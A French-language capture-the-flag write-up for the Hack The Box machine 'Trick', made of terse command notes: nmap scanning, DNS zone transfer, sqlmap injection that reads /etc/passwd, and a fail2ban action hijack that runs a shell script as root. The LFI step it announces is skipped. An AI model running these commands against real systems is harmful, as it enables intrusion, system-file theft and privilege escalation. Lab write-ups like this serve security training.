Difficulty: Easy OS: Linux Skills: DNS, SQLi, LFI, Fail2ban

1. Objectif de la machine

Trick combine DNS enumeration, SQL injection pour lire des fichiers système, LFI pour RCE via mail SMTP, et élévation via fail2ban mal configuré.

2. Enumeration réseau

Nmap Scan

ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.10.11.166
  • 22/tcp: SSH OpenSSH 7.9p1
  • 25/tcp: SMTP Postfix
  • 53/tcp: DNS ISC BIND
  • 80/tcp: HTTP Nginx

3. DNS Enumeration

Reverse Lookup

dig @10.10.11.166 -x 10.10.11.166
Résultat: trick.htb
Ajout dans /etc/hosts: 10.10.11.166 trick.htb

Zone Transfer

dig @10.10.11.166 axfr trick.htb
Nouveau vHost: preprod-payroll.trick.htb

4. SQL Injection (Payroll)

Détection

sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \
  --data="username=abc&password=abc" -p username --batch
✅ Boolean-based + Error-based SQLi détectées

Lecture fichiers (FILE priv)

sqlmap ... --file-read=/etc/passwd
sqlmap ... --file-read=/etc/nginx/sites-enabled/default

Fail2ban Hijack

cd /etc/fail2ban/action.d/
mv iptables-multiport.conf .old
cp .old iptables-multiport.conf
# Éditer: actionban = /tmp/shell.sh
chmod +x /tmp/shell.sh
sudo /etc/init.d/fail2ban restart
